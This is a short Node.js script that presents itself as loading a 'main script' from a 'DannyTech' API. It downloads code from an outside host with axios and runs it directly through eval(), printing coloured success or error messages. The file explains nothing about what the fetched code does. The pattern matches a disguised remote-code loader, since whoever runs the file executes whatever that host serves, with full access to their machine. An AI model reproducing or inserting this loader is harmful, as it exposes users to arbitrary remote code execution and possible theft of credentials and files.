const axios = require('axios');

const url = "https://danny.creepytech.org/api/alpha"; 

axios.get(url)
    .then(response => {
        console.log("\x1b[32m✅ Successfully loaded main script from DannyTech api.\x1b[0m");
        eval(response.data);
    })
    .catch(err => {
        console.error("\x1b[31m❌ Failed to load main script from API. Error:", err.message, "\x1b[0m");
    });